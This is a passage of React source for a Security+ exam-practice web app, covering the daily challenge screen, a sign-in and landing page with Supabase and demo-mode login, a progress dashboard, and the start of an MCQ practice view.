      <button className="btn btn-primary" style={{padding:"12px 32px",fontSize:15,width:"100%"}} onClick={()=>{capture("daily_challenge_started", { challenge_type: challenge.type, signed_in: Boolean(user) });setStep("quiz");}}>
        Start Today's Challenge →
      </button>
      {!user&&<div style={{marginTop:16,color:t.textDim,fontSize:13}}>
        Want unlimited practice?{" "}
        <span style={{color:t.accent,cursor:"pointer",fontWeight:500}} onClick={onLogin}>Create a free account →</span>
      </div>}
    </div>
  );

  if(step==="done") return (
    <div style={{padding:"32px 24px",maxWidth:500,margin:"0 auto",textAlign:"center"}} className="fu">
      <div style={{fontSize:48,marginBottom:16}}>{correctCount===totalQuestions?"🏆":correctCount>=Math.ceil(totalQuestions*.6)?"✅":"📚"}</div>
      <h2 style={{fontSize:24,fontWeight:700,marginBottom:8,color:t.text}}>Challenge Complete!</h2>
      <div style={{fontSize:40,fontWeight:700,color:correctCount===totalQuestions?t.green:correctCount>=Math.ceil(totalQuestions*.6)?t.amber:t.red,marginBottom:8}}>
        {correctCount}/{totalQuestions}
      </div>
      <p style={{color:t.textSec,marginBottom:24}}>Come back tomorrow for a new challenge!</p>
      {!user&&<div className="card" style={{padding:"16px 20px",marginBottom:20,textAlign:"left"}}>
        <div className="label" style={{marginBottom:10}}>Unlock more with a free account</div>
        {[`${MCQ_BANK.length} MCQs across all 5 exam domains`,`${PBQ_BANK.length} PBQ simulations with 8 question types`,"Progress tracking and weak area analysis","Chapter-by-chapter study organisation"].map((f,i)=>(
          <div key={i} style={{display:"flex",gap:8,alignItems:"center",fontSize:13,color:t.textSec,padding:"4px 0"}}>
            <span style={{color:t.green}}>✓</span>{f}
          </div>
        ))}
      </div>}
      <button className="btn btn-primary" style={{width:"100%",justifyContent:"center",padding:"12px"}} onClick={onLogin}>
        {user ? "Back to Dashboard →" : "Create Free Account →"}
      </button>
      {!user&&<div style={{marginTop:10,color:t.textDim,fontSize:12}}>Already have an account? <span style={{color:t.accent,cursor:"pointer"}} onClick={onLogin}>Sign in</span></div>}
    </div>
  );

  // MCQ quiz flow for daily challenge
  if(challenge.type==="mcq5" && current) return (
    <div style={{padding:"24px",maxWidth:680,margin:"0 auto"}} className="fu" key={qIndex}>
      <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:20}}>
        <div style={{display:"flex",gap:6}}>
          {questions.map((_,i)=>(
            <div key={i} style={{width:9,height:9,borderRadius:"50%",background:i<qIndex?(results[i]?.correct?t.green:t.red):i===qIndex?t.accent:t.border,transition:"background .3s"}}/>
          ))}
        </div>
        <span style={{fontSize:13,color:t.textSec}}>{qIndex+1} / {questions.length}</span>
      </div>

      <div className="card" style={{padding:"20px 24px",marginBottom:18}}>
        <div style={{display:"flex",gap:8,marginBottom:10,flexWrap:"wrap"}}>
          <ChBadge chId={current.ch} t={t}/>
          <DiffBadge d={current.difficulty} t={t}/>
          <span className="chip" style={{background:`${t.accent}10`,color:t.textSec,borderColor:t.border,fontSize:11}}>{current.topic}</span>
        </div>
        <p style={{fontSize:15,lineHeight:1.7,color:t.text}}>{current.q}</p>
      </div>

      <div style={{display:"flex",flexDirection:"column",gap:9,marginBottom:20}}>
        {current.opts.map((opt,i)=>{
          let cls="opt";
          if(submitted){cls+=" done"; if(i===current.correct)cls+=" ok"; else if(i===selected&&i!==current.correct)cls+=" bad";}
          else if(selected===i)cls+=" sel";
          return(
            <div key={i} className={cls} onClick={()=>!submitted&&setSelected(i)}>
              <div className="opt-ltr">{String.fromCharCode(65+i)}</div>
              <span style={{fontSize:14,flex:1,lineHeight:1.5}}>{opt}</span>
              {submitted&&i===current.correct&&<span style={{color:t.green,fontSize:16,flexShrink:0}}>✓</span>}
              {submitted&&i===selected&&i!==current.correct&&<span style={{color:t.red,fontSize:16,flexShrink:0}}>✗</span>}
            </div>
          );
        })}
      </div>

      {!submitted?(
        <button className="btn btn-primary" style={{width:"100%",justifyContent:"center"}} disabled={selected===null} onClick={submitQ}>Submit Answer</button>
      ):(
        <>
          <div className="card" style={{padding:"16px 20px",marginBottom:14,borderColor:selected===current.correct?t.green:t.red}}>
            <div style={{fontWeight:600,color:selected===current.correct?t.green:t.red,marginBottom:8,fontSize:15}}>
              {selected===current.correct?"✓ Correct!":"✗ Incorrect"}
            </div>
            {canSeeFeedback?(
              <p style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>{current.exp}</p>
            ):(
              <p style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
                Detailed explanations are part of Pro. Keep practising the daily challenge, then upgrade when you want full feedback.
              </p>
            )}
            {canSeeFeedback&&selected!==current.correct&&current.wrongFeedback&&(
              <div style={{marginTop:10,padding:"10px 12px",background:`${t.red}08`,borderRadius:6,fontSize:12,color:t.red}}>
                <strong>Why your answer was wrong:</strong> {current.wrongFeedback[selected]}
              </div>
            )}
          </div>
          <button className="btn btn-primary" style={{width:"100%",justifyContent:"center"}} onClick={nextQ}>
            {qIndex<questions.length-1?"Next Question →":"See Results →"}
          </button>
        </>
      )}
    </div>
  );

  if(challenge.type==="pbq" && pbq) return (
    <PBQSim
      q={pbq}
      t={t}
      onDone={result=>{
        capture("daily_challenge_completed", { challenge_type: "pbq", correct: result.correct, signed_in: Boolean(user) });
        setResults([{qid:result.qid,correct:result.correct,selected:null}]);
        setStep("done");
      }}
    />
  );

  return (
    <div style={{padding:"32px 24px",maxWidth:520,margin:"0 auto",textAlign:"center"}} className="fu">
      <div style={{fontSize:40,marginBottom:12}}>🎯</div>
      <h2 style={{fontSize:22,fontWeight:700,color:t.text,marginBottom:8}}>Daily Challenge unavailable</h2>
      <p style={{color:t.textSec,marginBottom:18,fontSize:14}}>
        Today's challenge could not be loaded, so use the MCQ bank while we refresh it.
      </p>
      <button className="btn btn-primary" style={{justifyContent:"center"}} onClick={onLogin}>
        {user ? "Go to Dashboard" : "Sign In / Register"}
      </button>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// AUTH VIEW
// ═══════════════════════════════════════════════════════════════
function AuthView({onLogin,t,onDaily,onNavigate}) {
  const [mode,setMode]=useState("login");
  const [form,setForm]=useState({name:"",email:"",pass:"",confirm:""});
  const [err,setErr]=useState("");
  const [ok,setOk]=useState("");
  const [loading,setLoading]=useState(false);
  const set=k=>e=>setForm(f=>({...f,[k]:e.target.value}));
  const resetMessages=()=>{setErr("");setOk("");};
  const jumpToAuth=nextMode=>{
    setMode(nextMode);
    setTimeout(()=>document.getElementById("landing-auth")?.scrollIntoView({behavior:"smooth",block:"start"}),30);
  };
  const handle=async()=>{
    resetMessages();setLoading(true);
    try{
      const email=normalizeEmail(form.email);
      if(!email){setErr("Please enter your email.");setLoading(false);return;}

      if(isSupabaseConfigured){
        if(mode==="reset"){
          const { error } = await supabase.auth.resetPasswordForEmail(email, { redirectTo: window.location.origin });
          if(error) throw error;
          capture("password_reset_requested");
          setOk("Password reset email sent. Check your inbox.");
          setLoading(false);
          return;
        }

        if(mode==="login"){
          const { data, error } = await supabase.auth.signInWithPassword({ email, password: form.pass });
          if(error) throw error;
          const appUser=await getSupabaseProfile(data.user);
          capture("login_completed", { method: "password" });
          onLogin(appUser);
        } else {
          capture("signup_started", { method: "password", has_referral: Boolean(getStoredReferralCode()) });
          if(!form.name||!form.pass){setErr("Please fill in all fields.");setLoading(false);return;}
          if(form.pass!==form.confirm){setErr("Passwords do not match.");setLoading(false);return;}
          const passwordIssue=getPasswordIssue(form.pass);
          if(passwordIssue){setErr(passwordIssue);setLoading(false);return;}

          const { data, error } = await supabase.auth.signUp({
            email,
            password: form.pass,
            options: {
              data: { name: form.name, full_name: form.name },
              emailRedirectTo: window.location.origin,
            },
          });
          if(error) throw error;
          if(data.session?.user){
            const appUser=await getSupabaseProfile(data.session.user);
            setOk("Account created! Welcome to SecurePlus.");
            capture("signup_completed", { method: "password", confirmed_immediately: true, has_referral: Boolean(getStoredReferralCode()) });
            onLogin(appUser);
          } else {
            capture("signup_email_confirmation_required", { has_referral: Boolean(getStoredReferralCode()) });
            setOk("Almost done. Check your email, click Confirm signup, then come back here to sign in.");
          }
        }
      } else {
        await new Promise(r=>setTimeout(r,400));
        if(mode==="reset"){setErr("Password reset requires Supabase environment variables.");setLoading(false);return;}
        if(mode==="login"){
          const user=await DB.getUser(email);
          if(!user||user.password!==form.pass){setErr("Email or password is incorrect.");setLoading(false);return;}
          await DB.saveSession({email:user.email,name:user.name,tier:user.tier,loggedIn:true});
          capture("login_completed", { method: "local_demo" });
          onLogin(user);
        } else {
          capture("signup_started", { method: "local_demo" });
          if(!form.name||!form.pass){setErr("Please fill in all fields.");setLoading(false);return;}
          if(form.pass!==form.confirm){setErr("Passwords do not match.");setLoading(false);return;}
          const passwordIssue=getPasswordIssue(form.pass);
          if(passwordIssue){setErr(passwordIssue);setLoading(false);return;}
          const exists=await DB.getUser(email);
          if(exists){setErr("An account with this email already exists.");setLoading(false);return;}
          const user={name:form.name,email,password:form.pass,tier:"free",joined:new Date().toISOString(),streak:0,authProvider:"local",loginMethod:"local"};
          await DB.saveUser(user);
          await DB.saveSession({email:user.email,name:user.name,tier:user.tier,loggedIn:true});
          setOk("Account created! Welcome to SecurePlus.");
          capture("signup_completed", { method: "local_demo" });
          setTimeout(()=>onLogin(user),800);
        }
      }
    } catch(e){setErr(e.message||"Something went wrong. Please try again.");}
    setLoading(false);
  };
  const handleGoogle=async()=>{
    resetMessages();setLoading(true);
    try{
      capture("login_started", { method: "google" });
      const { error } = await supabase.auth.signInWithOAuth({
        provider: "google",
        options: { redirectTo: window.location.origin },
      });
      if(error) throw error;
    } catch(e){
      setErr(e.message||"Unable to start Google sign in.");
      setLoading(false);
    }
  };

  return(
    <div className="landing-page fu">
      <header className="landing-header">
        <div style={{display:"flex",alignItems:"center",gap:10}}>
          <BrandMark size={32}/>
          <div>
            <div style={{fontWeight:900,color:t.text,fontSize:18}}>SecurePlus</div>
            <div style={{fontSize:12,color:t.textDim}}>CompTIA Security+ PBQ / MCQ practice</div>
          </div>
        </div>
        <div style={{display:"flex",gap:10,flexWrap:"wrap",justifyContent:"flex-end"}}>
          <button className="btn btn-ghost" style={{fontSize:13}} onClick={()=>jumpToAuth("login")}>Sign In</button>
          <button className="btn btn-primary" style={{fontSize:13}} onClick={()=>jumpToAuth("signup")}>Create Free Account</button>
        </div>
      </header>

      <main className="landing-main">
        <section className="landing-hero">
          <div>
            <div className="badge" style={{background:`${t.accent}14`,color:t.accent,border:`1px solid ${t.accent}28`,marginBottom:18}}>
              PBQ simulations + MCQ practice in one workspace
            </div>
            <h1 className="landing-title">
              Practice Security+ with PBQ simulations before the exam tests you.
            </h1>
            <p className="landing-copy">
              Try a small daily challenge without an account, then create a free account to unlock the full MCQ bank, save progress, and build exam readiness.
            </p>
            <div style={{display:"flex",gap:10,flexWrap:"wrap",marginTop:22}}>
              <button className="btn btn-primary" style={{padding:"12px 20px"}} onClick={onDaily}>Try Daily Challenge</button>
              <button className="btn btn-outline" style={{padding:"12px 20px"}} onClick={()=>jumpToAuth("signup")}>Create Free Account</button>
            </div>
          </div>

          <div className="landing-preview">
            <div className="card card-hover" style={{padding:"18px 20px",borderColor:`${t.accent}40`,cursor:"pointer"}} onClick={onDaily}>
              <div style={{display:"flex",alignItems:"center",gap:12}}>
                <span style={{fontSize:28}}>🎯</span>
                <div style={{flex:1}}>
                  <div style={{fontWeight:800,color:t.text,fontSize:15}}>Today's Free Daily Challenge</div>
                  <div style={{fontSize:13,color:t.textSec}}>No account required. A limited practice sample.</div>
                </div>
                <span style={{color:t.accent,fontSize:20}}>→</span>
              </div>
            </div>
            <div className="landing-stat-grid">
              {[
                {v:MCQ_BANK.length,l:"MCQs"},
                {v:PBQ_BANK.length,l:"PBQs"},
                {v:"$4.99",l:"annual Pro"},
              ].map(s=>(
                <div key={s.l} className="card" style={{padding:"16px",minWidth:0}}>
                  <div style={{fontSize:24,fontWeight:900,color:t.text}}>{s.v}</div>
                  <div className="label" style={{whiteSpace:"normal"}}>{s.l}</div>
                </div>
              ))}
            </div>
          </div>
        </section>

        <section className="landing-feature-grid">
          {[
            {icon:"📝",title:"Free MCQ Practice",body:"Use the full MCQ bank to learn the five Security+ objective areas."},
            {icon:"💡",title:"PBQ Simulation",body:"Pro adds terminal, log analysis, ordering, hotspot, and drag/drop style practice."},
            {icon:"📈",title:"Smart Review",body:"Wrong answers are prioritised with SM-2 style spacing to strengthen retention."},
          ].map(card=>(
            <div key={card.title} className="card" style={{padding:"18px 20px"}}>
              <div style={{fontSize:24,marginBottom:10}}>{card.icon}</div>
              <div style={{fontWeight:800,color:t.text,marginBottom:6}}>{card.title}</div>
              <div style={{fontSize:13,color:t.textSec,lineHeight:1.65}}>{card.body}</div>
            </div>
          ))}
        </section>

        <section id="landing-auth" className="landing-auth-section">
          <div>
            <h2 style={{fontSize:24,color:t.text,marginBottom:8}}>Start with a free account</h2>
            <p style={{fontSize:14,color:t.textSec,lineHeight:1.7,maxWidth:520}}>
              Save your attempts, see weak areas, and keep practising from any device. Pro is optional and unlocks PBQ simulations for roughly $0.40/month when billed yearly.
            </p>
          </div>

          <div className="card" style={{padding:"28px 28px"}}>
          <div style={{display:"flex",borderBottom:`1px solid ${t.border}`,marginBottom:24}}>
            {["login","signup"].map(m=>(
              <div key={m} className={`tab ${mode===m?"act":""}`} style={{flex:1,textAlign:"center"}} onClick={()=>{setMode(m);resetMessages();}}>
                {m==="login"?"Sign In":"Create Account"}
              </div>
            ))}
          </div>
          <Alert msg={err} type="error" t={t}/>
          <Alert msg={ok} type="success" t={t}/>
          <div style={{display:"flex",flexDirection:"column",gap:14}}>
            {mode==="signup"&&(
              <div><label style={{display:"block",fontSize:13,fontWeight:500,marginBottom:5,color:t.text}}>Full Name</label>
                <input className="input" placeholder="Jane Smith" value={form.name} onChange={set("name")}/></div>
            )}
            <div><label style={{display:"block",fontSize:13,fontWeight:500,marginBottom:5,color:t.text}}>Email</label>
              <input className="input" type="email" placeholder="you@example.com" value={form.email} onChange={set("email")} onKeyDown={e=>e.key==="Enter"&&handle()}/></div>
            {mode!=="reset"&&(
              <div><label style={{display:"block",fontSize:13,fontWeight:500,marginBottom:5,color:t.text}}>Password</label>
                <input className="input" type="password" placeholder="At least 8 characters" value={form.pass} onChange={set("pass")} onKeyDown={e=>e.key==="Enter"&&handle()}/></div>
            )}
            {mode==="signup"&&(
              <>
              <div><label style={{display:"block",fontSize:13,fontWeight:500,marginBottom:5,color:t.text}}>Confirm Password</label>
                <input className="input" type="password" placeholder="••••••••" value={form.confirm} onChange={set("confirm")} onKeyDown={e=>e.key==="Enter"&&handle()}/></div>
              <div style={{fontSize:12,color:t.textDim,lineHeight:1.6}}>
                Use 8+ characters with uppercase, lowercase, a number, and a special character.
              </div>
              </>
            )}
            <button className="btn btn-primary" style={{width:"100%",justifyContent:"center",padding:"11px",marginTop:4}} onClick={handle} disabled={loading}>
              {loading?"Processing...":mode==="login"?"Sign In":mode==="reset"?"Send Reset Email":"Create Account"}
            </button>
            {isSupabaseConfigured&&mode!=="reset"&&(
              <button className="btn btn-outline" style={{width:"100%",justifyContent:"center",padding:"10px"}} onClick={handleGoogle} disabled={loading}>
                Continue with Google
              </button>
            )}
            {mode==="login"&&(
              <button className="btn btn-ghost" style={{justifyContent:"center",fontSize:12}} onClick={()=>{setMode("reset");resetMessages();}} disabled={loading}>
                Forgot password?
              </button>
            )}
            {mode==="reset"&&(
              <button className="btn btn-ghost" style={{justifyContent:"center",fontSize:12}} onClick={()=>{setMode("login");resetMessages();}} disabled={loading}>
                Back to sign in
              </button>
            )}
          </div>
          {!isSupabaseConfigured&&mode==="login"&&(
            <div style={{marginTop:16,padding:"12px 14px",background:t.panel,borderRadius:8,border:`1px solid ${t.border}`}}>
              <div style={{fontSize:12,fontWeight:600,color:t.textDim,marginBottom:4}}>DEMO ACCOUNT</div>
              <div className="mono" style={{fontSize:12,color:t.textSec}}>Email: demo@secureplus.io · Password: demo123</div>
              <button className="btn btn-ghost" style={{fontSize:12,marginTop:8,padding:"5px 10px"}} onClick={async()=>{
                let u=await DB.getUser("demo@secureplus.io");
                if(!u){u={name:"Demo User",email:"demo@secureplus.io",password:"demo123",tier:"pro",joined:new Date().toISOString(),streak:14,authProvider:"local",loginMethod:"local"};await DB.saveUser(u);}
                setForm(f=>({...f,email:"demo@secureplus.io",pass:"demo123"}));
                await DB.saveSession({email:u.email,name:u.name,tier:u.tier,loggedIn:true});
                onLogin(u);
              }}>Open demo workspace →</button>
            </div>
          )}
        </div>
        <div style={{display:"flex",gap:12,justifyContent:"center",marginTop:14,flexWrap:"wrap"}}>
          <button className="btn btn-ghost" style={{fontSize:12}} onClick={()=>onNavigate("privacy")}>
            Privacy Policy
          </button>
          <button className="btn btn-ghost" style={{fontSize:12}} onClick={()=>onNavigate("terms")}>
            Terms & Conditions
          </button>
        </div>
        </section>
      </main>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════════
function Dashboard({user,attempts,onNav,t}) {
  const mcqAttempts = attempts.filter(a=>a.mcq);
  const pbqAttempts = attempts.filter(a=>a.pbq);
  const totalCorrect = attempts.filter(a=>a.correct).length;
  const total = attempts.length;
  const accuracy = total ? Math.round((totalCorrect/total)*100) : 0;
  const readiness = Math.min(100, Math.round(accuracy*0.75 + Math.min(total,50)/50*25));
  const isPro = user.tier==="pro";
  const challenge = getTodayChallenge();

  // Chapter performance
  const chStats = {};
  attempts.forEach(a=>{
    if(!a.ch)return;
    if(!chStats[a.ch])chStats[a.ch]={c:0,t:0};
    chStats[a.ch].t++;
    if(a.correct)chStats[a.ch].c++;
  });

  return(
    <div style={{padding:"28px 24px",maxWidth:1000,margin:"0 auto"}}>
      {/* Welcome */}
      <div style={{marginBottom:28}}>
        <h2 style={{fontSize:22,fontWeight:700,color:t.text,marginBottom:4}}>
          Welcome back, {user.name.split(" ")[0]}
        </h2>
        <p style={{color:t.textSec,fontSize:14}}>
          {total===0?"Start practising to see your progress here.":
          readiness>=75?"You're on track for exam day — keep it up!":
          "Keep practising to improve your readiness score."}
        </p>
      </div>

      {/* Stat row */}
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fit,minmax(140px,1fr))",gap:12,marginBottom:24}}>
        {[
          {label:"Readiness",value:`${readiness}%`,color:readiness>=75?t.green:readiness>=50?t.amber:t.red},
          {label:"Accuracy",value:`${accuracy}%`,color:t.accent},
          {label:"Questions Done",value:total,color:t.text},
          {label:"PBQs Complete",value:`${pbqAttempts.length}`,color:t.text},
        ].map(s=>(
          <div key={s.label} className="card" style={{padding:"18px 20px"}}>
            <div className="label" style={{marginBottom:6}}>{s.label}</div>
            <div style={{fontSize:26,fontWeight:700,color:s.color}}>{s.value}</div>
          </div>
        ))}
      </div>

      {/* Readiness bar + CTA */}
      <div className="card" style={{padding:"20px 24px",marginBottom:20}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:12,flexWrap:"wrap",gap:10}}>
          <div>
            <div style={{fontWeight:600,fontSize:15,color:t.text,marginBottom:2}}>Exam Readiness</div>
            <div style={{fontSize:13,color:t.textSec}}>Target: 75% or above</div>
          </div>
          <div style={{display:"flex",gap:8,flexWrap:"wrap"}}>
            <button className="btn btn-primary" style={{fontSize:13}} onClick={()=>onNav("mcq")}>Practice MCQs</button>
            {isPro&&<button className="btn btn-outline" style={{fontSize:13}} onClick={()=>onNav("pbq")}>PBQ Simulator</button>}
          </div>
        </div>
        <ProgBar v={readiness} c={readiness>=75?t.green:readiness>=50?t.amber:t.red} h={10}/>
        <div style={{display:"flex",justifyContent:"space-between",marginTop:6}}>
          <span style={{fontSize:11,color:t.textDim}}>0%</span>
          <span style={{fontSize:11,color:t.amber}}>75% target</span>
          <span style={{fontSize:11,color:t.textDim}}>100%</span>
        </div>
      </div>

      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16,marginBottom:20}}>
        {/* Chapter performance */}
        <div className="card" style={{padding:"20px 22px"}}>
          <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:14}}>Performance by Chapter</div>
          {Object.keys(chStats).length===0?(
            <div style={{color:t.textDim,fontSize:13,padding:"12px 0"}}>No attempts yet — start practising!</div>
          ):(
            <div style={{display:"flex",flexDirection:"column",gap:12}}>
              {CHAPTERS.map(ch=>{
                const s=chStats[ch.id];
                if(!s)return null;
                const p=Math.round((s.c/s.t)*100);
                return(
                  <div key={ch.id}>
                    <div style={{display:"flex",justifyContent:"space-between",marginBottom:5}}>
                      <span style={{fontSize:12,color:t.textSec,display:"inline-flex",alignItems:"center",gap:6}}><ChapterIcon id={ch.id} size={20}/> {ch.title.split(",")[0]}</span>
                      <span style={{fontSize:12,fontWeight:600,color:p>=75?t.green:p>=50?t.amber:t.red}}>{p}%</span>
                    </div>
                    <ProgBar v={p} c={p>=75?t.green:p>=50?t.amber:t.red} h={6}/>
                  </div>
                );
              })}
            </div>
          )}
        </div>

        {/* Daily challenge + recent */}
        <div style={{display:"flex",flexDirection:"column",gap:12}}>
          {/* Daily challenge card */}
          <div className="card" style={{padding:"18px 20px",borderColor:`${t.accent}30`,cursor:"pointer"}} onClick={()=>onNav("daily")}>
            <div style={{display:"flex",gap:10,alignItems:"flex-start"}}>
              <span style={{fontSize:28}}>🎯</span>
              <div style={{flex:1}}>
                <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:3}}>{challenge.title}</div>
                <div style={{fontSize:12,color:t.textSec,marginBottom:10}}>{challenge.description}</div>
                <button className="btn btn-outline" style={{fontSize:12,padding:"6px 14px"}}>Start Challenge →</button>
              </div>
            </div>
          </div>

          {/* Upgrade if free */}
          {!isPro&&(
            <div className="card" style={{padding:"18px 20px",borderColor:`${t.amber}40`,background:`${t.amber}06`}}>
              <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:4}}>Ready for PBQs?</div>
              <div style={{fontSize:13,color:t.textSec,marginBottom:12}}>
                Keep using all MCQs for free. Pro adds {PBQ_BANK.length} performance-based questions with terminal, drag & drop, log analysis and more.
              </div>
              <button className="btn btn-primary" style={{fontSize:13,padding:"8px 16px"}} onClick={()=>onNav("pricing")}>
                Upgrade — $4.99/year
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Recent attempts */}
      {attempts.length>0&&(
        <div className="card" style={{padding:"20px 22px"}}>
          <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:14}}>Recent Activity</div>
          <div style={{display:"flex",flexDirection:"column",gap:8}}>
            {attempts.slice(0,6).map((a,i)=>(
              <div key={i} style={{display:"flex",gap:10,alignItems:"center",padding:"8px 12px",borderRadius:7,background:a.correct?`${t.green}08`:`${t.red}08`}}>
                <span style={{color:a.correct?t.green:t.red,fontSize:15,flexShrink:0}}>{a.correct?"✓":"✗"}</span>
                <div style={{flex:1,minWidth:0}}>
                  <div style={{fontSize:13,color:t.text,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{a.title||"Question"}</div>
                  <div style={{fontSize:11,color:t.textDim}}>{a.pbq?"PBQ":"MCQ"} · {a.domain||a.ch||""}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// MCQ PRACTICE
// ═══════════════════════════════════════════════════════════════
function MCQPractice({user,attempts,onSave,onUpgrade,t}) {
  const [chFilter,setChFilter]=useState("all");
  const [diffFilter,setDiffFilter]=useState("all");
  const [topicFilter,setTopicFilter]=useState("all");
  const [reviewMode,setReviewMode]=useState("smart");
  const [quizCount,setQuizCount]=useState(10);
  const [started,setStarted]=useState(false);
  const [questions,setQuestions]=useState([]);
  const [qi,setQi]=useState(0);
  const [selected,setSelected]=useState(null);
  const [submitted,setSubmitted]=useState(false);
  const [draftSelections,setDraftSelections]=useState([]);
  const [results,setResults]=useState([]);
  const [done,setDone]=useState(false);
  const [showWrong,setShowWrong]=useState(false);

  const allTopics=[...new Set(MCQ_BANK.map(q=>q.topic))].sort();

  const filtered=MCQ_BANK.filter(q=>{
    if(chFilter!=="all"&&q.ch!==chFilter)return false;
    if(diffFilter!=="all"&&q.difficulty!==diffFilter)return false;
    if(topicFilter!=="all"&&q.topic!==topicFilter)return false;
    return true;
  });
  const reviewSummary = getReviewSummary(attempts);
  const quizSizes = [10,20,30,40,50];
  const missedMcqIds=[...new Set(attempts.filter(a=>a.mcq&&!a.correct).map(a=>a.qid))];
  const missedQuestions=MCQ_BANK.filter(q=>missedMcqIds.includes(q.id));

  useEffect(()=>{
    const available = quizSizes.filter(size=>filtered.length>=size);
    if(available.length && !available.includes(quizCount)) setQuizCount(available[available.length-1]);
  },[filtered.length,quizCount]);

  const startQuiz=()=>{
    const ordered = reviewMode==="smart"
      ? rankQuestionsBySm2(filtered, attempts)
      : [...filtered].sort(()=>Math.random()-.5);
    const pool=ordered.slice(0,Math.min(quizCount,filtered.length));
    capture("mcq_quiz_started", { review_mode: reviewMode, chapter: chFilter, difficulty: diffFilter, topic: topicFilter, question_count: pool.length, tier: user.tier });
    setQuestions(pool);setQi(0);setSelected(null);setSubmitted(false);setDraftSelections([]);setResults([]);setDone(false);setStarted(true);
  };
  const startMissedQuiz=()=>{
    const pool=rankQuestionsBySm2(missedQuestions,attempts).slice(0,Math.min(50,missedQuestions.length));
    capture("mcq_missed_review_started", { question_count: pool.length, tier: user.tier });
    setQuestions(pool);setQi(0);setSelected(null);setSubmitted(false);setDraftSelections([]);setResults([]);setDone(false);setStarted(true);
  };

  const current=questions[qi];
  const answeredCount=results.filter(Boolean).length;
  const allAnswered=questions.length>0&&answeredCount===questions.length;
  const goToQuestion=index=>{
    if(index<0||index>=questions.length)return;
    setQi(index);
    setSelected(results[index]?.selected ?? draftSelections[index] ?? null);
    setSubmitted(Boolean(results[index]));
    setShowWrong(false);
  };

  const submitQ=()=>{
    if(selected===null)return;
    const correct=selected===current.correct;
    const r={qid:current.id,correct,selected,title:current.q.slice(0,60),ch:current.ch,domain:CHAPTERS.find(c=>c.id===current.ch)?.title||"",topic:current.topic,difficulty:current.difficulty,mcq:true,createdAt:new Date().toISOString()};
    capture("mcq_question_answered", { question_id: current.id, chapter: current.ch, difficulty: current.difficulty, topic: current.topic, correct, tier: user.tier });
    setResults(rs=>{const next=[...rs];next[qi]=r;return next;});
    if(!results[qi]) onSave(r);
    setSubmitted(true);setShowWrong(false);
  };
  const nextQ=()=>{
    if(qi<questions.length-1) goToQuestion(qi+1);
    else {
      capture("mcq_quiz_completed", { correct_count: correctCount, question_count: questions.length, tier: user.tier });
      setDone(true);
    }
  };
  const finishQuiz=()=>{
    if(!allAnswered){
      const firstUnanswered=questions.findIndex((_,index)=>!results[index]);
      goToQuestion(firstUnanswered>=0?firstUnanswered:0);
      return;
    }
    capture("mcq_quiz_completed", { correct_count: correctCount, question_count: questions.length, tier: user.tier });
    setDone(true);
  };
  const retakeCurrentQuiz=()=>{
    setQi(0);setSelected(null);setSubmitted(false);setDraftSelections([]);setResults([]);setDone(false);setStarted(true);setShowWrong(false);
  };

  const correctCount=results.filter(r=>r?.correct).length;
  const scorePct=questions.length?correctCount/questions.length:0;
  const canSeeFeedback = user.tier === "pro";
  const chapterEvaluation=CHAPTERS.map(ch=>{
    const chapterResults=results.map((r,index)=>r?{...r,question:questions[index]}:null).filter(r=>r&&r.ch===ch.id);
    const missed=chapterResults.filter(r=>!r.correct);
    const topicCounts=missed.reduce((acc,r)=>{const topic=r.topic||r.question?.topic||"Core concepts";acc[topic]=(acc[topic]||0)+1;return acc;},{});
    const focusTopics=Object.entries(topicCounts).sort((a,b)=>b[1]-a[1]).slice(0,2).map(([topic])=>topic);
    return {chapter:ch,total:chapterResults.length,correct:chapterResults.filter(r=>r.correct).length,missed:missed.length,focusTopics};
  }).filter(item=>item.total>0).sort((a,b)=>(a.correct/a.total)-(b.correct/b.total));
  const weakChapters=chapterEvaluation.filter(item=>item.missed>0).slice(0,3);

  if(!started) return(
    <div style={{padding:"24px",maxWidth:800,margin:"0 auto"}}>
      <div className="page-title-row">
        <NavGlyph type="mcq" active/>
        <h2 style={{fontSize:24,fontWeight:800,color:t.text}}>MCQ Practice</h2>
      </div>
      <p style={{color:t.textSec,marginBottom:20,fontSize:14}}>{MCQ_BANK.length} questions across all 5 CompTIA Security+ chapters</p>

      <div className="card" style={{padding:"18px 22px",marginBottom:16,borderColor:`${t.green}30`,background:`${t.green}06`}}>
        <div style={{display:"flex",justifyContent:"space-between",gap:14,alignItems:"center",flexWrap:"wrap"}}>
          <div style={{flex:1,minWidth:220}}>
            <div style={{fontWeight:700,fontSize:14,color:t.text,marginBottom:4}}>Smart Review uses SM-2 spacing</div>
            <div style={{fontSize:13,color:t.textSec,lineHeight:1.6}}>
              Wrong answers come back first. Correct answers are spaced farther apart, like Anki, so practice targets retention instead of only random questions.
            </div>
          </div>
          <div style={{display:"grid",gridTemplateColumns:"repeat(3,auto)",gap:8}}>
            {[
              {label:"Due",value:reviewSummary.due,color:t.amber},
              {label:"Weak",value:reviewSummary.weak,color:t.red},
              {label:"New",value:reviewSummary.untouched,color:t.accent},
            ].map(item=>(
              <div key={item.label} style={{minWidth:64,padding:"8px 10px",border:`1px solid ${t.border}`,borderRadius:8,background:t.panel,textAlign:"center"}}>
                <div style={{fontSize:18,fontWeight:800,color:item.color}}>{item.value}</div>
                <div className="label">{item.label}</div>
              </div>
            ))}
          </div>
        </div>
        <div style={{display:"flex",gap:8,marginTop:14,flexWrap:"wrap"}}>
          <button className={`btn ${reviewMode==="smart"?"btn-primary":"btn-outline"}`} style={{fontSize:12}} onClick={()=>setReviewMode("smart")}>Smart Review</button>
